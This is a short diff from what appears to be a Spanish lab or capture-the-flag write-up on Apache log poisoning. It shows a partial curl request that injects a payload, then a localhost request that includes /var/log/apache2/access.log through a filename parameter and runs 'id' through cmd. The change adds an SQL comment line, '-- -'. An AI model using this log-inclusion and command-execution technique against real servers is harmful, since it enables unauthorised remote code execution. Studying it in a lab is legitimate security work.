@@ -29,3 +29,4 @@ Una vez inyectado el payload; ```curl -s -X GET "http://localhost/probando" -H "
 ```bash
 localhost/?filename=/var/log/apache2/access.log&cmd=id
 ```
+-- -
